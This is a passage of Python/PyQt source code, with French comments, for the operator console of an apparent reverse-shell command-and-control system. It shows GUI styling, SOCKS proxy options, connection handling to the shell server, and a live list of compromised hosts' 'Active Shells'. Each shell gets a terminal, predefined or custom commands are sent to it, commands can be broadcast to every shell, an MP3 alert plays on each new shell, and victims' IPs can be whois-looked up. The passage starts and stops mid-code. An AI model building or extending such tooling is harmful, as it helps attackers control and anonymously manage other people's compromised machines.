        # --- Style amélioré pour le bouton Broadcast ---
        self.broadcast_btn.setStyleSheet("""
             QPushButton {
                 background-color: #5A5A5D;
                 color: #FFFFFF;
                 border: none;
                 border-radius: 5px;
                 padding: 6px 12px;
                 font-weight: bold;
                 font-size: 10px;
             }
             QPushButton:hover {
                 background-color: #6A6A6D;
             }
             QPushButton:pressed {
                 background-color: #4A4A4D;
                 padding: 7px 11px 5px 13px;
             }
             QPushButton:disabled {
                 background-color: #3A3A3D;
                 color: #777777;
             }
         """)
        # --- Fin du style amélioré ---
        quick_layout.addWidget(self.broadcast_btn)
        # --- Ajout du bouton Whois Active Shells ---
        self.whois_active_btn = QPushButton("Whois Active Shells")
        self.whois_active_btn.clicked.connect(self.perform_bulk_whois)
        self.whois_active_btn.setStyleSheet(self.broadcast_btn.styleSheet()) # Réutiliser le style
        quick_layout.addWidget(self.whois_active_btn)
        # --- Fin de l'ajout ---
        # Toggle sidebar button
        self.toggle_sidebar_btn = QPushButton("Hide Sidebar")
        self.toggle_sidebar_btn.setCheckable(True)
        self.toggle_sidebar_btn.toggled.connect(self.toggle_sidebar)
        # --- Style amélioré pour le bouton Toggle Sidebar ---
        self.toggle_sidebar_btn.setStyleSheet("""
             QPushButton {
                 background-color: #5A5A5D;
                 color: #FFFFFF;
                 border: none;
                 border-radius: 5px;
                 padding: 6px 12px;
                 font-weight: bold;
                 font-size: 10px;
             }
             QPushButton:hover {
                 background-color: #6A6A6D;
             }
             QPushButton:pressed {
                 background-color: #4A4A4D;
                 padding: 7px 11px 5px 13px;
             }
             QPushButton:disabled {
                 background-color: #3A3A3D;
                 color: #777777;
             }
         """)
        # --- Fin du style amélioré ---
        quick_layout.addWidget(self.toggle_sidebar_btn)
        left_layout.addWidget(quick_actions)
        # --- Proxy Configuration (NOUVEL AJOUT) ---
        self.proxy_group = QGroupBox("Proxy Configuration")
        self.proxy_group.setStyleSheet(dashboard_group.styleSheet())
        proxy_layout = QFormLayout(self.proxy_group)
        proxy_layout.setFieldGrowthPolicy(QFormLayout.FieldGrowthPolicy.AllNonFixedFieldsGrow)
        proxy_layout.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
        self.proxy_enabled_checkbox = QCheckBox("Enable Proxy")
        self.proxy_enabled_checkbox.setChecked(getattr(self, 'proxy_enabled', False))
        proxy_layout.addRow(self.proxy_enabled_checkbox)
        self.proxy_type_combo = QComboBox()
        self.proxy_type_combo.addItems(["SOCKS5", "SOCKS4", "HTTP"])
        self.proxy_type_combo.setCurrentText(getattr(self, 'proxy_type', 'SOCKS5'))
        proxy_layout.addRow("Type:", self.proxy_type_combo)
        self.proxy_host_input = QLineEdit()
        self.proxy_host_input.setText(getattr(self, 'proxy_host', ''))
        self.proxy_host_input.setPlaceholderText("e.g., 127.0.0.1")
        proxy_layout.addRow("Host:", self.proxy_host_input)
        self.proxy_port_input = QLineEdit()
        self.proxy_port_input.setText(getattr(self, 'proxy_port', ''))
        self.proxy_port_input.setPlaceholderText("e.g., 9050")
        proxy_layout.addRow("Port:", self.proxy_port_input)
        self.proxy_user_input = QLineEdit()
        self.proxy_user_input.setText(getattr(self, 'proxy_user', ''))
        self.proxy_user_input.setPlaceholderText("Optional")
        proxy_layout.addRow("Username:", self.proxy_user_input)
        self.proxy_pass_input = QLineEdit()
        self.proxy_pass_input.setText(getattr(self, 'proxy_pass', ''))
        self.proxy_pass_input.setPlaceholderText("Optional")
        self.proxy_pass_input.setEchoMode(QLineEdit.EchoMode.Password)
        proxy_layout.addRow("Password:", self.proxy_pass_input)
        # Disable if PySocks is not available
        if not SOCKS_AVAILABLE:
            self.proxy_group.setEnabled(False)
            self.proxy_group.setTitle("Proxy Configuration (Disabled)")
        left_layout.addWidget(self.proxy_group)
        # --- Fin du nouvel ajout ---
        # --- MP3 Alert Configuration (Ajouté) ---
        self.mp3_group = QGroupBox("MP3 Alert (New Shell)")
        self.mp3_group.setStyleSheet(dashboard_group.styleSheet()) # Réutilise l'apparence du groupe
        mp3_layout = QFormLayout(self.mp3_group)
        mp3_layout.setFieldGrowthPolicy(QFormLayout.FieldGrowthPolicy.AllNonFixedFieldsGrow)
        mp3_layout.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
        # Checkbox pour activer/désactiver
        self.mp3_alert_checkbox = QCheckBox("Enable MP3 Alert")
        # --- Charger l'état depuis les paramètres (Ajouté) ---
        self.mp3_alert_checkbox.setChecked(getattr(self, 'mp3_enabled', False))
        # --- Fin de l'ajout ---
        mp3_layout.addRow(self.mp3_alert_checkbox)
        # Ligne pour le chemin du fichier
        self.mp3_file_input = QLineEdit()
        # --- Charger le chemin depuis les paramètres (Ajouté) ---
        self.mp3_file_input.setText(getattr(self, 'mp3_file_path', ""))
        # --- Fin de l'ajout ---
        self.mp3_file_input.setPlaceholderText("Path to .mp3 file")
        # Bouton pour parcourir les fichiers
        self.mp3_browse_btn = QPushButton("Browse...")
        self.mp3_browse_btn.clicked.connect(self.browse_mp3_file)
        # --- Style amélioré pour le bouton Browse ---
        self.mp3_browse_btn.setStyleSheet("""
             QPushButton {
                 background-color: #5A5A5D;
                 color: #FFFFFF;
                 border: none;
                 border-radius: 5px;
                 padding: 4px 8px;
                 font-weight: bold;
                 font-size: 9px;
             }
             QPushButton:hover {
                 background-color: #6A6A6D;
             }
             QPushButton:pressed {
                 background-color: #4A4A4D;
                 padding: 5px 7px 3px 9px;
             }
         """)
        # --- Fin du style amélioré ---
        mp3_file_layout = QHBoxLayout()
        mp3_file_layout.addWidget(self.mp3_file_input)
        mp3_file_layout.addWidget(self.mp3_browse_btn)
        mp3_layout.addRow("MP3 File:", mp3_file_layout)
        # Ajouter le groupe à la disposition de gauche
        left_layout.addWidget(self.mp3_group)
        # --- Fin de l'ajout ---
        left_layout.addStretch()
        # --- MODIFICATION POUR LE REDIMENSIONNEMENT VERTICAL ---
        # Central area for terminal and logs - Utiliser un splitter vertical
        self.central_area = QWidget()
        central_main_layout = QVBoxLayout(self.central_area) # Layout principal pour le cadre de connexion
        central_main_layout.setContentsMargins(8, 8, 8, 8)
        central_main_layout.setSpacing(6) # Espacement entre les éléments
        # Connection bar (reste en haut, taille fixe)
        connection_frame = QFrame()
        connection_frame.setFrameStyle(QFrame.Shape.StyledPanel)
        connection_frame.setStyleSheet("""
            QFrame {
                background-color: #2D2D30;
                border: 1px solid #3E3E40;
                border-radius: 4px;
            }
        """)
        connection_layout = QHBoxLayout(connection_frame)
        connection_layout.setContentsMargins(12, 8, 12, 8)
        # Server connection controls
        server_label = QLabel("Server:")
        server_label.setStyleSheet("color: #CCCCCC; font-weight: bold; font-size: 10px;")
        connection_layout.addWidget(server_label)
        self.host_input = QLineEdit(self.server_host)
        self.host_input.setStyleSheet("""
            QLineEdit {
                background-color: #333333;
                color: #FFFFFF;
                border: 1px solid #555555;
                border-radius: 3px;
                padding: 4px;
                font-family: Consolas;
                font-size: 10px;
            }
        """)
        self.host_input.setFixedWidth(120)
        connection_layout.addWidget(self.host_input)
        port_label = QLabel("Port:")
        port_label.setStyleSheet("color: #CCCCCC; font-weight: bold; font-size: 10px;")
        connection_layout.addWidget(port_label)
        self.port_input = QLineEdit(str(self.server_port))
        self.port_input.setStyleSheet("""
            QLineEdit {
                background-color: #333333;
                color: #FFFFFF;
                border: 1px solid #555555;
                border-radius: 3px;
                padding: 4px;
                font-family: Consolas;
                font-size: 10px;
            }
        """)
        self.port_input.setFixedWidth(50)
        connection_layout.addWidget(self.port_input)
        # Connect button
        self.connect_btn = QPushButton("Connect")
        # --- Style amélioré pour le bouton Connect ---
        # Augmenter la largeur de 20% (de 70 à 84)
        self.connect_btn.setStyleSheet("""
            QPushButton {
                background-color: #5A5A5D; /* Gris légèrement plus clair */
                color: #FFFFFF;
                border: none;
                border-radius: 5px; /* Bord arrondi */
                padding: 6px 12px;
                font-weight: bold;
                font-size: 10px;
                /* Ombre subtile */
                border: 1px solid #444446;
            }
            QPushButton:hover {
                background-color: #6A6A6D; /* Survol */
            }
            QPushButton:pressed {
                background-color: #4A4A4D; /* Pression */
                padding: 7px 11px 5px 13px; /* Léger décalage pour effet "enfoncé" */
            }
            QPushButton:disabled {
                background-color: #3A3A3D;
                color: #777777;
            }
        """)
        # --- Fin du style amélioré ---
        self.connect_btn.setFixedWidth(84) # Largeur augmentée de 20%
        connection_layout.addWidget(self.connect_btn)
        # --- Ajout du bouton Broadcast Command ---
        self.broadcast_cmd_btn = QPushButton("Broadcast Command")
        # --- Style amélioré pour le bouton Broadcast Command ---
        self.broadcast_cmd_btn.setStyleSheet("""
            QPushButton {
                background-color: #5A5A5D; /* Gris légèrement plus clair */
                color: #FFFFFF;
                border: none;
                border-radius: 5px; /* Bord arrondi */
                padding: 6px 12px;
                font-weight: bold;
                font-size: 10px;
                /* Ombre subtile */
                border: 1px solid #444446;
            }
            QPushButton:hover {
                background-color: #6A6A6D; /* Survol */
            }
            QPushButton:pressed {
                background-color: #4A4A4D; /* Pression */
                padding: 7px 11px 5px 13px; /* Léger décalage pour effet "enfoncé" */
            }
            QPushButton:disabled {
                background-color: #3A3A3D;
                color: #777777;
            }
        """)
        # --- Fin de le style amélioré ---
        self.broadcast_cmd_btn.setFixedWidth(140) # Largeur doublée
        self.broadcast_cmd_btn.clicked.connect(self.broadcast_command)
        connection_layout.addWidget(self.broadcast_cmd_btn)
        # --- Ajout du bouton Whois Active Shells (en haut) ---
        self.whois_active_top_btn = QPushButton("Whois Active Shells")
        self.whois_active_top_btn.clicked.connect(self.perform_bulk_whois)
        self.whois_active_top_btn.setStyleSheet(self.broadcast_cmd_btn.styleSheet()) # Réutiliser le style
        self.whois_active_top_btn.setFixedWidth(140) # Largeur doublée
        connection_layout.addWidget(self.whois_active_top_btn)
        # --- Fin de l'ajout ---
        # Status label
        self.status_label = QLabel("Disconnected")
        # --- Style initial pour le label de statut ---
        self.status_label.setStyleSheet("""
            QLabel {
                color: #FF6B6B;
                font-weight: bold;
                padding: 4px;
                background-color: #5A1E1E;
                border-radius: 3px;
                font-size: 10px;
            }
        """)
        # --- Fin du style initial ---
        connection_layout.addWidget(self.status_label)
        connection_layout.addStretch()
        # Ajouter le cadre de connexion au layout principal
        central_main_layout.addWidget(connection_frame) # Taille fixe
        # --- NOUVEAU : Splitter vertical pour Terminal et Log ---
        self.central_vertical_splitter = QSplitter(Qt.Orientation.Vertical)
        self.central_vertical_splitter.setChildrenCollapsible(False) # Optionnel : empêcher le collapsus complet
        # Terminal area
        self.terminal_group = QGroupBox("Terminal")
        self.terminal_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #3E3E40;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
                flex: 1; /* Prend tout l'espace disponible */
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #CCCCCC;
            }
        """)
        terminal_layout = QVBoxLayout(self.terminal_group)
        # Create a stacked widget to hold terminals
        self.terminals_stack = QStackedWidget()
        # Create a default terminal placeholder
        self.default_terminal = QTextEdit()
        self.default_terminal.setReadOnly(True)
        self.default_terminal.setText("Select a shell from the list to view its terminal.")
        self.default_terminal.setStyleSheet("""
            QTextEdit {
                background-color: #1E1E1E;
                color: #AAAAAA;
                border: 1px solid #3E3E40;
                border-radius: 2px;
                font-family: Consolas;
                font-size: 10px;
            }
        """)
        self.terminals_stack.addWidget(self.default_terminal)
        terminal_layout.addWidget(self.terminals_stack)
        # Ajouter le groupe terminal au splitter vertical
        self.central_vertical_splitter.addWidget(self.terminal_group)
        # Log area
        log_frame = QFrame()
        # --- MODIFICATION IMPORTANTE : Supprimer les max-height fixes ---
        # Supprimer ou commenter les lignes max-height du styleSheet de log_frame
        # Exemple: log_frame.setStyleSheet("max-height: 78px; ...") -> Supprimer max-height
        log_frame.setStyleSheet(""" /* max-height supprimé */
            QFrame {
                background-color: #2D2D30;
                border: 1px solid #3E3E40;
                border-radius: 4px;
                /* max-height: 78px; */ /* LIGNE SUPPRIMÉE */
            }
        """)
        log_layout = QVBoxLayout(log_frame)
        log_layout.setContentsMargins(8, 4, 8, 4)
        log_title = QLabel("Session Log & Alerts")
        log_title.setStyleSheet("color: #CCCCCC; font-weight: bold; font-size: 10px;")
        log_layout.addWidget(log_title)
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        # --- MODIFICATION IMPORTANTE : Supprimer maximumHeight fixe ---
        # self.log_area.setMaximumHeight(39) # LIGNE SUPPRIMÉE
        self.log_area.setFont(QFont("Consolas", 9))
        self.log_area.setStyleSheet("""
            QTextEdit {
                background-color: #1E1E1E;
                color: #AAAAAA;
                border: 1px solid #3E3E40;
                border-radius: 2px;
                font-family: Consolas;
                font-size: 9px;
            }
        """)
        log_layout.addWidget(self.log_area)
        # Ajouter le cadre log au splitter vertical
        self.central_vertical_splitter.addWidget(log_frame)
        # Ajouter le splitter vertical au layout principal de la zone centrale
        central_main_layout.addWidget(self.central_vertical_splitter) # Prend tout l'espace restant
        # --- FIN DE LA MODIFICATION ---
        # Right panel for Active Shells list (vertical column)
        self.right_panel = QWidget()
        self.right_panel.setFixedWidth(200)  # Largeur fixe pour la colonne
        self.right_panel.setMinimumWidth(150)
        self.right_panel.setMaximumWidth(300) # Limite la largeur maximale
        right_layout = QVBoxLayout(self.right_panel)
        right_layout.setContentsMargins(8, 8, 8, 8)
        # Active Shells group
        active_shells_group = QGroupBox("Active Shells")
        active_shells_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #3E3E40;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
                height: 100%; /* Prend toute la hauteur disponible */
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #CCCCCC;
            }
        """)
        active_shells_layout = QVBoxLayout(active_shells_group)
        active_shells_layout.setContentsMargins(0, 0, 0, 0)
        # Shell list widget
        self.shell_list_widget = QListWidget()
        self.shell_list_widget.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.shell_list_widget.customContextMenuRequested.connect(self.show_shell_context_menu)
        self.shell_list_widget.itemClicked.connect(self.on_shell_selected)
        active_shells_layout.addWidget(self.shell_list_widget)
        right_layout.addWidget(active_shells_group)
        # Add panels to main splitter
        self.main_splitter.addWidget(self.left_panel)
        self.main_splitter.addWidget(self.central_area) # Ajout de la zone centrale qui contient maintenant le splitter vertical
        self.main_splitter.addWidget(self.right_panel)
        # Set initial sizes (left, center, right)
        # Le centre prend environ 3/4 de la largeur totale (1400 - 300 - 200 = 900)
        self.main_splitter.setSizes([300, 900, 200])
        # --- NOUVEAU : Définir les tailles initiales pour le splitter vertical ---
        # Définir une taille initiale raisonnable pour le terminal et le log
        # Par exemple, terminal: 70%, log: 30% de la hauteur disponible du splitter vertical
        # Vous pouvez ajuster ces valeurs.
        # QTimer.singleShot est utilisé pour s'assurer que les widgets ont une taille définie avant de fixer les proportions.
        QTimer.singleShot(0, lambda: self.central_vertical_splitter.setSizes([1500, 300]))
        # --- FIN DE LA NOUVEAU ---
        # Apply dark theme
        self.apply_dark_theme()
        # Status bar
        self.statusBar().setStyleSheet("""
            QStatusBar {
                background-color: #2D2D30;
                color: #CCCCCC;
                border-top: 1px solid #3E3E40;
                font-family: 'Segoe UI';
                font-size: 9px;
            }
        """)
        self.statusBar().showMessage("Ready")
    def apply_dark_theme(self):
        """Apply dark theme"""
        dark_palette = QPalette()
        dark_palette.setColor(QPalette.ColorRole.Window, QColor(45, 45, 48))
        dark_palette.setColor(QPalette.ColorRole.WindowText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ColorRole.Base, QColor(30, 30, 30))
        dark_palette.setColor(QPalette.ColorRole.Text, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ColorRole.Button, QColor(45, 45, 48))
        dark_palette.setColor(QPalette.ColorRole.ButtonText, QColor(220, 220, 220))
        dark_palette.setColor(QPalette.ColorRole.Highlight, QColor(14, 99, 156))
        dark_palette.setColor(QPalette.ColorRole.HighlightedText, QColor(255, 255, 255))
        self.setPalette(dark_palette)
    def setup_connections(self):
        """Setup signal connections"""
        self.connect_btn.clicked.connect(self.toggle_connection)
        # Setup message processing timer
        self.timer = QTimer()
        self.timer.timeout.connect(self.process_queue)
        self.timer.start(10)
    def toggle_connection(self):
        """Toggle server connection"""
        if not self.connected:
            self.connect_to_server()
        else:
            self.disconnect_from_server()
    def connect_to_server(self):
        """Connect to the reverse shell server, using proxy if configured"""
        # --- Ajout : Curseur de chargement ---
        QApplication.setOverrideCursor(Qt.CursorShape.WaitCursor)
        # --- Fin de l'ajout ---
        try:
            host = self.host_input.text()
            port = int(self.port_input.text())
            # --- MODIFICATION: Utilisation du proxy ---
            if SOCKS_AVAILABLE and self.proxy_enabled_checkbox.isChecked():
                self.log_message("Connecting via proxy...")
                proxy_type_str = self.proxy_type_combo.currentText()
                proxy_type = {
                    "SOCKS5": socks.SOCKS5,
                    "SOCKS4": socks.SOCKS4,
                    "HTTP": socks.HTTP
                }.get(proxy_type_str, socks.SOCKS5)
                proxy_host = self.proxy_host_input.text()
                proxy_port_text = self.proxy_port_input.text()
                if not proxy_host or not proxy_port_text:
                    raise ValueError("Proxy host and port must be set")
                proxy_port = int(proxy_port_text)
                self.socket = socks.socksocket()
                self.socket.set_proxy(
                    proxy_type,
                    proxy_host,
                    proxy_port,
                    username=self.proxy_user_input.text() or None,
                    password=self.proxy_pass_input.text() or None
                )
            else:
                self.log_message("Connecting directly...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # --- FIN DE LA MODIFICATION ---
            self.socket.settimeout(10.0) # Increased timeout for proxy
            self.socket.connect((host, port))
            self.connected = True
            # Save settings including auto-connect
            self.auto_connect = True
            self.save_settings()
            # Update UI
            self.connect_btn.setText("Disconnect")
            # --- Remplacement de la mise à jour directe du style par l'appel à la méthode animée ---
            self.update_status_label("Connected", True)
            # --- Fin du remplacement ---
            self.host_input.setEnabled(False)
            self.port_input.setEnabled(False)
            self.log_message(f"Connected to server {host}:{port}")
            self.signals.alert.emit("connection", f"Connected to {host}:{port}")
            # Start listening thread
            threading.Thread(target=self.listen_to_server, daemon=True).start()
            # --- Ajout : Demander la liste des shells actifs après une courte pause ---
            # Attendre un peu que le serveur soit prêt à répondre
            QTimer.singleShot(500, self.request_active_shells)
            # --- Fin de l'ajout ---
        except Exception as e:
            QMessageBox.critical(self, "Connection Error", f"Cannot connect: {str(e)}")
            if self.socket:
                try:
                    self.socket.close()
                except:
                    pass
            self.start_auto_reconnect()
        finally:
            # --- Ajout : Restaurer le curseur ---
            QApplication.restoreOverrideCursor()
            # --- Fin de l'ajout ---
    # --- Ajout : Méthode pour demander la liste des shells actifs ---
    def request_active_shells(self):
        """Request the list of currently active shells from the server."""
        if self.connected and self.socket:
            try:
                message = json.dumps({
                    'type': 'get_active_shells'
                })
                self.socket.send(message.encode('utf-8'))
                self.log_message("Requested list of active shells from server.")
            except Exception as e:
                self.log_message(f"Error requesting active shells: {str(e)}")
                self.start_auto_reconnect()
    # --- Fin de l'ajout ---
    # --- Ajout : Méthode pour gérer la liste des shells actifs reçue ---
    def handle_active_shells_list(self, shells_list):
        """Handle the list of active shells received from the server."""
        self.log_message(f"Received active shells list: {len(shells_list)} shells")
        for shell_info in shells_list:
            # Utiliser add_shell_to_list pour créer les entrées
            self.add_shell_to_list(shell_info)
    # --- Fin de l'ajout ---
    def disconnect_from_server(self):
        """Disconnect from the server"""
        self.connected = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None  # Important pour éviter les erreurs
        # Update UI
        self.connect_btn.setText("Connect")
        # --- Remplacement de la mise à jour directe du style par l'appel à la méthode animée ---
        self.update_status_label("Disconnected", False)
        # --- Fin du remplacement ---
        self.host_input.setEnabled(True)
        self.port_input.setEnabled(True)
        self.log_message("Disconnected from server")
        self.signals.alert.emit("disconnection", "Disconnected from server")
        # Close all shell tabs
        for shell_id in list(self.shells.keys()):
            self.remove_shell_from_list({'shell_id': shell_id})
        # Disable auto-connect on manual disconnect
        self.auto_connect = False
        self.save_settings()
    def start_auto_reconnect(self):
        """Start automatic reconnection timer"""
        if not self.connected:
            self.reconnect_timer.start(5000)  # Try every 5 seconds
    def try_reconnect(self):
        """Attempt to reconnect to server"""
        if not self.connected:
            self.log_message("Attempting to reconnect...")
            self.connect_to_server()
        else:
            self.reconnect_timer.stop()
    def listen_to_server(self):
        """Listen for messages from the server"""
        buffer = ""
        try:
            while self.connected and self.socket:
                try:
                    data = self.socket.recv(8192).decode('utf-8', errors='ignore')
                    if not data:
                        self.signals.connection_status.emit(False)
                        break
                    buffer += data
                    # Process complete JSON messages
                    while buffer:
                        try:
                            message, idx = json.JSONDecoder().raw_decode(buffer)
                            # --- Modification : Ajout de 'active_shells_list' aux types traités ---
                            if message['type'] in ['new_shell', 'shell_output', 'shell_disconnected', 'active_shells_list']:
                                self.message_queue.append(
                                    (message['type'], message['data']))
                            # --- Fin de la modification ---
                            buffer = buffer[idx:].lstrip()
                        except json.JSONDecodeError:
                            break
                        except ValueError:
                            buffer = ""
                            break
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.connected:
                        self.signals.log_message.emit(
                            f"Receive error: {str(e)}")
                        self.signals.connection_status.emit(False)
                    break
        except Exception as e:
            if self.connected:
                self.signals.connection_status.emit(False)
                self.signals.log_message.emit(f"Connection error: {str(e)}")
        # Start auto-reconnect if disconnected
        if not self.connected:
            self.start_auto_reconnect()
    def process_queue(self):
        """Process messages from the queue"""
        try:
            while self.message_queue:
                message_type, data = self.message_queue.popleft()
                if message_type == 'new_shell':
                    self.signals.new_shell.emit(data)
                elif message_type == 'shell_output':
                    self.signals.shell_output.emit(data)
                elif message_type == 'shell_disconnected':
                    self.signals.shell_disconnected.emit(data)
                # --- Ajout : Gestion du type 'active_shells_list' ---
                elif message_type == 'active_shells_list':
                    self.signals.active_shells_list.emit(data)
                # --- Fin de l'ajout ---
                # Gestion des transferts de fichiers supprimée
        except Exception as e:
            self.log_message(f"Queue error: {str(e)}")
    # --- Ajout : Méthode pour mettre à jour le label de statut avec animation ---
    def update_status_label(self, text, is_connected):
        # Arrêter l'animation précédente si elle existe
        if self.status_animation and self.status_animation.state() == QAbstractAnimation.State.Running:
            self.status_animation.stop()
        # Définir les styles cibles
        if is_connected:
            target_color = QColor("#7FDC7F")
            target_bg = QColor("#1E3A1E")
            style_template = """
                QLabel {{
                    color: {}; /* Placeholder pour la couleur */
                    font-weight: bold;
                    padding: 4px;
                    background-color: {}; /* Placeholder pour le fond */
                    border-radius: 3px;
                    font-size: 10px;
                }}
            """
        else:
            target_color = QColor("#FF6B6B")
            target_bg = QColor("#5A1E1E")
            style_template = """
                QLabel {{
                    color: {};
                    font-weight: bold;
                    padding: 4px;
                    background-color: {};
                    border-radius: 3px;
                    font-size: 10px;
                }}
            """
        # Appliquer le nouveau texte
        self.status_label.setText(text)
        # Appliquer le nouveau style immédiatement (l'animation visuelle est subtile ici sans bibliothèque externe)
        # Pour un effet "pulse" ou "glow", il faudrait une logique plus complexe ou QML.
        self.status_label.setStyleSheet(style_template.format(target_color.name(), target_bg.name()))
        # Effet visuel simple : un léger changement de taille
        current_font = self.status_label.font()
        current_font.setPointSize(11) # Légère augmentation
        self.status_label.setFont(current_font)
        QTimer.singleShot(100, lambda: self.status_label.setFont(QFont("Segoe UI", 10))) # Revenir à la taille normale
    # --- Fin de l'ajout ---
    def add_shell_to_list(self, shell_info):
        """Add a new shell to the list"""
        shell_id = shell_info['id']
        # --- Modification : Vérifier si l'entrée existe déjà ---
        if shell_id in self.shells:
            # Si le shell existe déjà, ne pas le recréer
            return
        # Extract IP address from shell ID (format: ip:port)
        ip_address = shell_info['id'].split(':')[0]
        # Create terminal widget
        terminal = TerminalWidget()
        terminal.command_entered.connect(
            lambda cmd: self.send_command(shell_id, cmd))
        # Add terminal to stack
        self.terminals_stack.addWidget(terminal)
        # Create list item
        item = QListWidgetItem(ip_address)
        item.setData(Qt.ItemDataRole.UserRole, shell_id)  # Store shell_id in item
        # Add item to the top of the list (most recent first)
        self.shell_list_widget.insertItem(0, item)
        # --- Animation de flash pour le nouvel élément ---
        original_bg = item.background() # Sauvegarder la couleur d'origine
        # Créer une animation de couleur pour l'arrière-plan de l'item
        flash_anim = QVariantAnimation(self.shell_list_widget)
        flash_anim.setDuration(1000) # 1 seconde
        flash_anim.setStartValue(QColor(127, 220, 127, 100)) # Vert clair transparent
        flash_anim.setEndValue(original_bg.color() if original_bg.style() != Qt.BrushStyle.NoBrush else QColor(45, 45, 48)) # Couleur d'origine ou couleur de fond par défaut
        flash_anim.setLoopCount(2) # Flasher deux fois
        def update_item_color(color):
             item.setBackground(color)
        flash_anim.valueChanged.connect(update_item_color)
        flash_anim.start(QAbstractAnimation.DeletionPolicy.DeleteWhenStopped) # Se supprime automatiquement
        # --- Fin de l'animation de flash ---
        # Store reference
        self.shells[shell_id] = {
            'widget': item,
            'terminal': terminal,
            'info': shell_info,
            'terminal_index': self.terminals_stack.indexOf(terminal)
        }
        # Update dashboard
        self.shells_count_label.setText(
            f"Active Shells: {len(self.shells)}")
        self.system_info_label.setText(
            f"System: {shell_info.get('os', 'Unknown')}")
        self.log_message(f"New shell connected: {shell_id}")
        self.signals.alert.emit("new_shell", f"New shell: {shell_id}")
        # --- Déclencher l'alerte MP3 (Ajouté) ---
        # Utiliser QTimer.singleShot pour éviter tout blocage potentiel si le chargement du MP3 prend du temps
        QTimer.singleShot(0, self.play_mp3_alert)
        # --- Fin de l'ajout ---
    def send_command(self, shell_id, command):
        """Send command to shell"""
        if shell_id in self.shells and self.connected and self.socket:
            try:
                message = json.dumps({
                    'type': 'send_command',
                    'shell_id': shell_id,
                    'command': command + '\n'
                })
                self.socket.send(message.encode('utf-8'))
            except Exception as e:
                self.log_message(f"Command send error: {str(e)}")
                self.start_auto_reconnect()
    def broadcast_command(self):
        """Send command to all active shells with a delay to prevent packet merging"""
        if not self.shells:
            QMessageBox.warning(self, "Broadcast", "No active shells")
            return
        # Ouvrir la boîte de dialogue pour choisir la commande
        dialog = BroadcastCommandDialog(self.predefined_commands, self)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            command = dialog.get_command()
            if command:
                shell_ids = list(self.shells.keys())
                if shell_ids:
                    # Utiliser une approche avec QTimer pour espacer les envois
                    # Augmenter le délai à 200ms pour une meilleure fiabilité
                    self._send_broadcast_command(shell_ids, command + '\n', 0)
    def _send_broadcast_command(self, shell_ids, command, index):
        """Helper to send broadcast command with a delay between sends"""
        if index < len(shell_ids) and self.connected and self.socket:
            shell_id = shell_ids[index]
            self.send_command(shell_id, command.rstrip('\n')) # send_command ajoute deja \n
            # Planifier l'envoi au shell suivant après un délai plus long (200ms)
            QTimer.singleShot(200, lambda: self._send_broadcast_command(shell_ids, command, index + 1))
    def on_shell_selected(self, item):
        """Handle shell selection from the list"""
        shell_id = item.data(Qt.ItemDataRole.UserRole)
        if shell_id in self.shells:
            terminal_index = self.shells[shell_id]['terminal_index']
            self.terminals_stack.setCurrentIndex(terminal_index)
    def show_shell_context_menu(self, position):
        """Show context menu for shell list items"""
        item = self.shell_list_widget.itemAt(position)
        if item:
            shell_id = item.data(Qt.ItemDataRole.UserRole)
            if shell_id in self.shells:
                # Récupérer l'IP de l'élément
                ip_address = shell_id.split(':')[0] # Extraire l'IP de l'ID (format ip:port)

                # Déterminer l'OS du shell
                shell_os = self.shells[shell_id]['info'].get('os', 'Unknown')
                menu = QMenu()
                # Add predefined commands to context menu based on OS
                commands_menu = menu.addMenu("Send Command")
                if shell_os in self.predefined_commands:
                    for display_name, command in self.predefined_commands[shell_os][:20]:  # Limiter à 20 pour l'UI
                        action = QAction(f"{display_name} ({command})", self)
                        action.triggered.connect(lambda checked, cmd=command, sid=shell_id: self.send_command(sid, cmd))
                        commands_menu.addAction(action)
                else:
                    # Si l'OS n'est pas reconnu, afficher toutes les commandes
                    for os_name, commands in self.predefined_commands.items():
                        os_menu = commands_menu.addMenu(os_name)
                        for display_name, command in commands[:10]:  # Limiter à 10 par OS
                            action = QAction(f"{display_name} ({command})", self)
                            action.triggered.connect(lambda checked, cmd=command, sid=shell_id: self.send_command(sid, cmd))
                            os_menu.addAction(action)
                # Add separator
                menu.addSeparator()
                # Add custom command option
                custom_action = QAction("Send Custom Command...", self)
                custom_action.triggered.connect(lambda: self.send_custom_command(shell_id))
                menu.addAction(custom_action)
                # Add separator
                menu.addSeparator()
                # Add Whois option
                whois_action = QAction("Whois", self)
                whois_action.triggered.connect(lambda: self.perform_whois(ip_address))
                menu.addAction(whois_action)
                # Show menu
                menu.exec(self.shell_list_widget.mapToGlobal(position))

    # --- Ajout : Méthode pour effectuer le Whois avec ipwhois ---
    def perform_whois(self, ip_address):
        """Perform whois lookup on the given IP using ipwhois and display the result."""
        self.log_message(f"Performing whois lookup for {ip_address}...")
        output = ""

        if not IPWHOIS_AVAILABLE:
            output = "Error: 'ipwhois' library not found. Please install it (e.g., 'pip install ipwhois')."
        else:
            try:
                # Créer un objet IPWhois
                obj = IPWhois(ip_address)
                # Effectuer la requête Whois
                # Utiliser `inc_raw=True` pour inclure les données brutes si nécessaire
                results = obj.lookup_whois()
                # Formater les résultats pour l'affichage
                output_parts = []
                output_parts.append(f"Query: {results.get('query', 'N/A')}\n")
                output_parts.append(f"ASN Registry: {results.get('asn_registry', 'N/A')}\n")
                output_parts.append(f"ASN: {results.get('asn', 'N/A')}\n")
                output_parts.append(f"ASN CIDR: {results.get('asn_cidr', 'N/A')}\n")
                output_parts.append(f"ASN Country: {results.get('asn_country_code', 'N/A')}\n")
